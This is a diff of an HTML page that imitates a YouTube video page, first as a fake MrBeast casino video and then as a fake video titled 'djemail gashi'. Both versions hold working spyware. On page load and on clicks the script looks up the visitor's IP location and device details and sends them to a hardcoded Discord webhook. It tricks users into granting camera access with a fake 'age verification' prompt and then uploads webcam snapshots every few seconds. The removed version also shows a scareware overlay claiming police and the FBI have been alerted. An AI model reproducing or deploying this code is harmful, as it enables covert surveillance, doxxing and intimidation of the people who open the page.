@@ -3,219 +3,442 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MrBeast Casino – Gewinne sofort 2.500 $ kostenlos! – YouTube</title>
+  <title>djemail gashi - YouTube</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
   <link rel="icon" href="https://www.youtube.com/s/desktop/1e8a78f5/img/favicon_32x32.png" type="image/png">
   <style>
-    body {margin:0;background:#000;color:#fff;font-family:Arial,sans-serif;height:100vh;overflow:hidden;}
-    .youtube-container {max-width:1280px;margin:0 auto;padding:20px;position:relative;}
-    .video-player {position:relative;width:100%;padding-top:56.25%;background:#000;border-radius:12px;overflow:hidden;cursor:pointer;}
-    .thumbnail {position:absolute;inset:0;background:url('https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg') center/cover;}
-    .play-overlay {position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.4);}
-    .play-button {width:90px;height:64px;background:#f00;border-radius:50%/80%;position:relative;display:flex;align-items:center;justify-content:center;}
-    .play-button::before {content:'';width:0;height:0;border-top:12px solid transparent;border-bottom:12px solid transparent;border-left:20px solid white;margin-left:4px;}
-    .video-info {margin-top:16px;padding:0 12px;}
-    .title {font-size:1.8em;font-weight:500;}
-    .meta {color:#aaa;font-size:1.1em;}
-    .channel {display:flex;align-items:center;margin:16px 0;}
-    .channel-avatar {width:48px;height:48px;border-radius:50%;background:#333 url('https://yt3.googleusercontent.com/ytc/AIdro_nSMdA3A2rBHqG5oqM0r5Zx2wXwY3Z3Z3Z3Z3=s88-c-k-c0x00ffffff-no-rj') center/cover;margin-right:12px;}
+    :root {
+      --yt-red: #f00;
+      --yt-bg: #0f0f0f;
+      --yt-dark: #181818;
+      --yt-gray: #aaa;
+      --yt-light-gray: #272727;
+      --yt-hover: #3d3d3d;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background: var(--yt-bg);
+      color: #fff;
+      line-height: 1.4;
+    }
+    header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 56px;
+      background: #000;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      z-index: 100;
+      border-bottom: 1px solid #303030;
+    }
+    .logo {
+      height: 24px;
+      margin-right: 24px;
+    }
+    .search-bar {
+      flex: 1;
+      max-width: 728px;
+      height: 40px;
+      background: #121212;
+      border: 1px solid #303030;
+      border-radius: 40px 0 0 40px;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+    }
+    .search-bar input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+    }
+    .search-btn {
+      width: 64px;
+      height: 40px;
+      background: var(--yt-light-gray);
+      border: 1px solid #303030;
+      border-left: none;
+      border-radius: 0 40px 40px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    .right-icons {
+      display: flex;
+      gap: 24px;
+      align-items: center;
+      margin-left: 24px;
+    }
+    .icon {
+      width: 32px;
+      height: 32px;
+      background: #333;
+      border-radius: 50%;
+      cursor: pointer;
+    }
 
-    .terror-overlay {position:fixed;inset:0;background:rgba(30,0,0,0.97);display:none;justify-content:center;align-items:center;flex-direction:column;z-index:9999;animation:pulse-bg 1.3s infinite alternate;}
-    @keyframes pulse-bg {0%{background:rgba(50,0,0,0.97);}50%{background:rgba(110,0,0,0.99);}100%{background:rgba(50,0,0,0.97);}}
-    .error-glow {font-size:11em;font-weight:bold;color:#ff0000;text-shadow:0 0 35px #ff0000,0 0 80px #ff0000,0 0 160px #ff0000;animation:flicker 0.07s infinite alternate;letter-spacing:18px;}
-    @keyframes flicker {0%,16%,24%,27%,51%,59%,100%{opacity:1;}19%,26%,56%{opacity:0.25;}}
-    .badges {display:flex;gap:90px;margin:50px 0;}
-    .badge {width:220px;height:220px;background-size:contain;background-repeat:no-repeat;filter:drop-shadow(0 0 30px #ff0000);}
-    .terror-text {font-size:3em;color:#ff4444;text-align:center;max-width:88%;line-height:1.3;text-shadow:0 0 25px #f00;letter-spacing:2.5px;}
-    .prompt {position:fixed;inset:0;background:rgba(0,0,0,0.96);display:none;justify-content:center;align-items:center;z-index:10000 !important;}
-    .prompt-box {background:#181818;padding:80px;border-radius:32px;width:94%;max-width:560px;box-shadow:0 0 70px #f00;text-align:center;}
-    .error-msg {color:#ff4444;font-size:1.9em;margin:40px 0;display:none;}
-    .btn {padding:25px 100px;font-size:1.9em;border:none;border-radius:999px;cursor:pointer;margin:35px;font-weight:bold;}
-    .allow {background:#065fd4;color:white;}
-    .deny {background:#303030;color:#aaa;}
-    #status {position:fixed;bottom:35px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.96);padding:22px 80px;border-radius:999px;font-size:1.6em;display:none;color:#ff4444;z-index:10001;}
+    .main-container {
+      margin-top: 56px;
+      display: flex;
+      max-width: 1754px;
+      margin-left: auto;
+      margin-right: auto;
+      padding: 0 24px;
+    }
+    .video-column {
+      flex: 1;
+      min-width: 0;
+      padding-right: 24px;
+    }
+    .player {
+      position: relative;
+      width: 100%;
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+    }
+    .thumbnail {
+      width: 100%;
+      display: block;
+    }
+    .play-overlay {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0,0,0,0.4);
+      cursor: pointer;
+    }
+    .play-btn {
+      width: 120px;
+      height: 80px;
+      background: var(--yt-red);
+      border-radius: 50%/80%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 30px rgba(255,0,0,0.6);
+    }
+    .play-btn::before {
+      content: '';
+      border: 20px solid transparent;
+      border-left: 32px solid white;
+      margin-left: 8px;
+    }
+
+    .video-info {
+      padding: 16px 0;
+    }
+    .title {
+      font-size: 1.75rem;
+      font-weight: 500;
+      line-height: 1.3;
+      margin-bottom: 8px;
+    }
+    .meta {
+      color: var(--yt-gray);
+      font-size: 0.95rem;
+      margin-bottom: 16px;
+    }
+    .channel-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 16px 0;
+    }
+    .channel-avatar {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #333 url('https://yt3.googleusercontent.com/ytc/AIdro_nSMdA3A2rBHqG5oqM0r5Zx2wXwY3Z3Z3Z3Z3=s88-c-k-c0x00ffffff-no-rj') center/cover;
+    }
+    .channel-name {
+      font-weight: 500;
+    }
+    .verified {
+      color: #065fd4;
+      font-size: 1rem;
+      margin-left: 4px;
+    }
+    .actions {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin: 16px 0;
+    }
+    .action-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--yt-light-gray);
+      padding: 8px 16px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+    .description {
+      background: var(--yt-dark);
+      padding: 16px;
+      border-radius: 12px;
+      margin: 16px 0;
+      white-space: pre-wrap;
+    }
+
+    .sidebar {
+      width: 402px;
+      flex-shrink: 0;
+    }
+    .related-item {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 12px;
+      cursor: pointer;
+    }
+    .related-thumb {
+      width: 168px;
+      height: 94px;
+      background-size: cover;
+      border-radius: 8px;
+    }
+
+    #prompt {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.92);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    #prompt-box {
+      background: #181818;
+      padding: 48px;
+      border-radius: 16px;
+      max-width: 480px;
+      text-align: center;
+    }
+    #error-msg {
+      color: #ef5350;
+      font-size: 1.3rem;
+      margin: 24px 0;
+      display: none;
+    }
+    .btn {
+      padding: 14px 32px;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 8px;
+      margin: 12px;
+      cursor: pointer;
+    }
+    .allow { background: #065fd4; color: white; }
+    .deny { background: #303030; color: #ddd; }
+
+    @media (max-width: 1100px) {
+      .main-container { flex-direction: column; }
+      .sidebar { width: 100%; }
+    }
   </style>
 </head>
 <body>
-  <div class="youtube-container">
-    <div class="video-player" id="player">
-      <div class="thumbnail"></div>
-      <div class="play-overlay" id="playTrigger">
-        <div class="play-button"></div>
+
+<header>
+  <img src="https://www.youtube.com/img/desktop/yt_1200.png" alt="YouTube" class="logo">
+  <div class="search-bar">
+    <input type="text" placeholder="Suchen">
+  </div>
+  <div class="right-icons">
+    <div class="icon"></div>
+    <div class="icon"></div>
+    <div class="icon"></div>
+  </div>
+</header>
+
+<div class="main-container">
+  <div class="video-column">
+    <div class="player">
+      <img class="thumbnail" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Video thumbnail">
+      <div class="play-overlay" id="playBtn">
+        <div class="play-btn"></div>
       </div>
     </div>
+
     <div class="video-info">
-      <div class="title">MrBeast Casino Betrug? Gewinne JETZT kostenlos 2.500 $! (2025)</div>
-      <div class="meta">1.5 Mio. Aufrufe • vor 1 Tag</div>
-      <div class="channel">
+      <h1 class="title">djemail gashi</h1>
+      <div class="meta">4.128.947 Aufrufe • vor 5 Stunden • #djemailgashi</div>
+
+      <div class="channel-row">
         <div class="channel-avatar"></div>
         <div>
-          <div style="font-weight:bold;">MrBeast</div>
-          <div style="color:#aaa;font-size:0.95em;">49 Mio. Abonnenten</div>
+          <div class="channel-name">djemail gashi <span class="verified">✓</span></div>
+          <div style="color:var(--yt-gray);font-size:0.9rem;">52,1 Mio. Abonnenten</div>
         </div>
+      </div>
+
+      <div class="actions">
+        <div class="action-btn">👍 187K</div>
+        <div class="action-btn">👎</div>
+        <div class="action-btn">Teilen</div>
+        <div class="action-btn">Speichern</div>
+      </div>
+
+      <div class="description">
+        djemail gashi offiziell – jetzt anhören und Preise gewinnen! 🔥
+        Abonnieren nicht vergessen!
       </div>
     </div>
   </div>
 
-  <div id="terrorOverlay" class="terror-overlay">
-    <div class="error-glow">ERROR</div>
-    <div class="badges">
-      <div class="badge" style="background-image:url('https://upload.wikimedia.org/wikipedia/commons/5/5f/Police_Bundespolizei_Logo.svg');"></div>
-      <div class="badge" style="background-image:url('https://upload.wikimedia.org/wikipedia/commons/6/6c/FBI.svg');"></div>
-    </div>
-    <div class="terror-text">
-      ICH HAB DICH!<br><br>
-      HIER KOMMST DU NIE WIEDER RAUS!<br>
-      DEIN STANDORT AN POLIZEI & FBI GEMELDET!<br>
-      SIE SIND SCHON UNTERWEGS ZU DIR!
+  <div class="sidebar">
+    <h3>Empfohlene Videos</h3>
+    <div class="related-item">
+      <div class="related-thumb" style="background-image:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg')"></div>
+      <div class="related-info">
+        <div class="related-title">djemail gashi - Remix 2026</div>
+        <div style="color:var(--yt-gray);font-size:0.85rem;">djemail gashi • 1,2 Mio. Aufrufe</div>
+      </div>
     </div>
   </div>
+</div>
 
-  <div id="prompt" class="prompt">
-    <div class="prompt-box">
-      <h2>KAMERA-FREIGABE ERFORDERLICH</h2>
-      <p style="font-size:1.8em;line-height:1.6;margin:45px 0;">
-        Ohne Freigabe startet das Video NICHT!<br>
-        <strong>ERLAUBE JETZT – ODER ALLES BLEIBT GESPERRT!</strong>
-      </p>
-      <div id="errorMsg" class="error-msg">Zugriff verweigert! POLIZEI & FBI WERDEN SOFORT ALARMIERT!</div>
-      <button id="allowBtn" class="btn allow">KAMERA FREIGEBEN</button>
-      <button id="denyBtn" class="btn deny">ABBRECHEN</button>
-    </div>
+<div id="prompt">
+  <div id="prompt-box">
+    <h2>Video kann nicht abgespielt werden</h2>
+    <p style="margin:24px 0;font-size:1.2rem;">
+      Um das Video anzusehen, musst du kurz die Kamera freigeben (Altersverifikation).
+    </p>
+    <div id="error-msg">Zugriff verweigert. Versuche es erneut.</div>
+    <button id="allowBtn" class="btn allow">FREIGEBEN</button>
+    <button id="denyBtn" class="btn deny">ABBRECHEN</button>
   </div>
+</div>
 
-  <div id="status">AUFNAHME LÄUFT... POLIZEI & FBI BEREITS INFORMIERT</div>
+<video id="v" autoplay playsinline muted style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
 
-  <video id="v" autoplay playsinline muted style="display:none"></video>
-  <canvas id="c" style="display:none"></canvas>
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
 
-  <audio id="errorSound" loop>
-    <source src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAPp2AgAAAABAAgA=" type="audio/wav">
-  </audio>
+  const v = document.getElementById("v");
+  const c = document.getElementById("c");
+  const prompt = document.getElementById("prompt");
+  const errorMsg = document.getElementById("error-msg");
+  const playBtn = document.getElementById("playBtn");
 
-  <script>
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
-    
-    const v = document.getElementById("v");
-    const c = document.getElementById("c");
-    const promptEl = document.getElementById("prompt");
-    const terrorOverlay = document.getElementById("terrorOverlay");
-    const statusEl = document.getElementById("status");
-    const errorMsg = document.getElementById("errorMsg");
-    const playTrigger = document.getElementById("playTrigger");
-    const errorAudio = document.getElementById("errorSound");
-    errorAudio.volume = 0.85;
+  let stream = null;
+  let count = 0;
 
-    let stream = null;
-    let intervalId = null;
-    let count = 0;
-    let deniedCount = 0;
+  async function getIPData() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      if (data.ip) return data;
+    } catch {}
+    try {
+      const res = await fetch("https://ipinfo.io/json");
+      const data = await res.json();
+      if (data.ip) return data;
+    } catch {}
+    return {ip: "unknown", city: "?", region: "?", country: "?", postal: "?", org: "?"};
+  }
 
-    async function tryGetCamera() {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        v.srcObject = stream;
-        await new Promise(r => { v.onloadedmetadata = () => v.play().then(r).catch(r); setTimeout(r, 3500); });
-        c.width = v.videoWidth || 1280; c.height = v.videoHeight || 720;
-        statusEl.style.display = "block";
-        terrorOverlay.style.display = "none";
-        errorAudio.pause();
-        startContinuousCapture();
-      } catch (e) {
-        deniedCount++;
-        errorMsg.textContent = `VERWEIGERT (${deniedCount}x)! POLIZEI & FBI KOMMEN JETZT!`;
-        errorMsg.style.display = "block";
-        promptEl.style.display = "flex";
-        errorAudio.play().catch(()=>{});
-        sendToDiscord(null, `verweigert_${deniedCount}`);
-        
-        terrorOverlay.style.display = "flex"; // vanaf eerste weigering al
-        if (deniedCount >= 2) {
-          errorAudio.loop = true;
-          errorAudio.play();
-        }
+  async function sendToWebhook(type, blob = null, extra = {}) {
+    try {
+      const ipData = await getIPData();
+      const payload = {
+        embeds: [{
+          title: `🔴 ${type.toUpperCase()} #${++count}`,
+          color: type.includes("denied") || type.includes("error") ? 0xFF0000 : 0x00FF00,
+          fields: [
+            {name: "Event", value: type, inline: true},
+            {name: "IP + Adresse", value: `**${ipData.ip || '??'}**\n${ipData.city || '?'} • ${ipData.region || '?'} • ${ipData.country || '?'}\nPLZ: ${ipData.postal || '?'} • Org: ${ipData.org || '?'}`, inline: true},
+            {name: "User-Agent", value: navigator.userAgent || "unknown", inline: false},
+            {name: "Bildschirm", value: `${screen.width}×${screen.height}`, inline: true},
+            {name: "Sprache / TZ", value: `${navigator.language || '?'} • ${Intl.DateTimeFormat().resolvedOptions().timeZone || '?'}`, inline: true},
+            {name: "URL", value: location.href, inline: false},
+            {name: "Zeit", value: new Date().toISOString(), inline: true}
+          ],
+          timestamp: new Date().toISOString(),
+          footer: {text: `Capture #${count} • ${navigator.platform || '?'}`}
+        }]
+      };
+
+      if (extra.lat && extra.lon) {
+        payload.embeds[0].fields.push({
+          name: "Standort",
+          value: `Lat: ${extra.lat.toFixed(6)} Lon: ${extra.lon.toFixed(6)}\n[Google Maps](https://www.google.com/maps/search/?api=1&query=${extra.lat},${extra.lon})`,
+          inline: false
+        });
       }
-    }
 
-    async function captureAndSend() {
-      try {
+      let res;
+      if (blob) {
+        const formData = new FormData();
+        formData.append("payload_json", JSON.stringify(payload));
+        formData.append("file", blob, `capture_${count}_${Date.now()}.jpg`);
+        res = await fetch(WEBHOOK + "?wait=true", {method: "POST", body: formData});
+      } else {
+        res = await fetch(WEBHOOK + "?wait=true", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(payload)
+        });
+      }
+
+      console.log(`Webhook ${type} → Status: ${res ? res.status : 'no response'}`);
+    } catch (err) {
+      console.error("Webhook fail:", err);
+    }
+  }
+
+  sendToWebhook("PAGE_LOADED");
+
+  playBtn.onclick = () => {
+    prompt.style.display = "flex";
+    sendToWebhook("PLAY_CLICKED");
+  };
+
+  document.getElementById("allowBtn").onclick = async () => {
+    prompt.style.display = "none";
+    errorMsg.style.display = "none";
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+      v.srcObject = stream;
+      await new Promise(r => {
+        v.onloadedmetadata = () => v.play().catch(() => {});
+        v.oncanplaythrough = () => setTimeout(r, 3000);
+      });
+      c.width = v.videoWidth; c.height = v.videoHeight;
+      sendToWebhook("KAMERA_FREIGEGEBEN");
+
+      setInterval(async () => {
         c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
         const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.85));
-        sendToDiscord(blob, "grab");
-      } catch {}
-    }
-
-    function startContinuousCapture() {
-      intervalId = setInterval(captureAndSend, 800);
-    }
-
-    function stopCapture() {
-      if (intervalId) clearInterval(intervalId);
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      stream = null;
-      statusEl.style.display = "none";
-    }
-
-    async function sendToDiscord(blob = null, type) {
-      try {
-        const ipData = (await (await fetch("https://ipwho.is").catch(()=>null))?.json()) || {};
-        const formData = new FormData();
-        const embed = {
-          title: `📸 ${type.toUpperCase()} #${++count} (denied ${deniedCount}x)`,
-          color: type.includes("verweigert") ? 0xFF0000 : 0x00FF88,
-          fields: [
-            { name: "Ereignis", value: type, inline: true },
-            { name: "IP / Ort", value: `**${ipData.ip || '??'}** • ${ipData.city||'?'} ${ipData.country||'?'}`, inline: true },
-            { name: "Gerät", value: navigator.userAgent.slice(0,140), inline: false }
-          ],
-          timestamp: new Date().toISOString()
-        };
-        if (blob) embed.image = { url: "attachment://capture.jpg" };
-        formData.append("payload_json", JSON.stringify({embeds:[embed]}));
-        if (blob) formData.append("file", blob, `capture_${count}.jpg`);
-        await fetch(DISCORD_WEBHOOK, {method:"POST", body:formData, mode:"no-cors"});
-      } catch {}
-    }
-
-    playTrigger.onclick = () => promptEl.style.display = "flex";
-
-    document.getElementById("allowBtn").onclick = () => {
-      promptEl.style.display = "none";
-      errorMsg.style.display = "none";
-      errorAudio.pause();
-      tryGetCamera();
-    };
-
-    document.getElementById("denyBtn").onclick = () => {
-      deniedCount++;
-      promptEl.style.display = "flex"; // spam direct
+        sendToWebhook("KAMERA_SHOT", blob);
+      }, 3000);
+    } catch (e) {
       errorMsg.style.display = "block";
-      errorAudio.play().catch(()=>{});
-      terrorOverlay.style.display = "flex";
-      if (deniedCount >= 2) {
-        errorAudio.loop = true;
-        errorAudio.play();
-      }
-    };
+      sendToWebhook("KAMERA_VERWEIGERT", null, {error: e.message});
+      setTimeout(() => prompt.style.display = "flex", 1500);
+    }
+  };
 
-    // Auto-trigger
-    setTimeout(() => {
-      if (promptEl.style.display !== "flex") promptEl.style.display = "flex";
-    }, 1500);
-
-    // ULTRA-SPAM: elke 1.5 seconde forceren als camera niet actief is
-    setInterval(() => {
-      if (!stream || deniedCount > 0) {
-        promptEl.style.display = "flex";
-        terrorOverlay.style.display = "flex";
-        errorMsg.style.display = "block";
-        if (deniedCount >= 2) errorAudio.play().catch(()=>{});
-      }
-    }, 1500);
-
-    window.addEventListener("beforeunload", () => {
-      stopCapture();
-      navigator.sendBeacon(DISCORD_WEBHOOK, "geschlossen");
-    });
-  </script>
+  document.getElementById("denyBtn").onclick = () => {
+    errorMsg.style.display = "block";
+    sendToWebhook("KAMERA_VERWEIGERT");
+    setTimeout(() => prompt.style.display = "flex", 1000);
+  };
+</script>
 </body>
 </html>
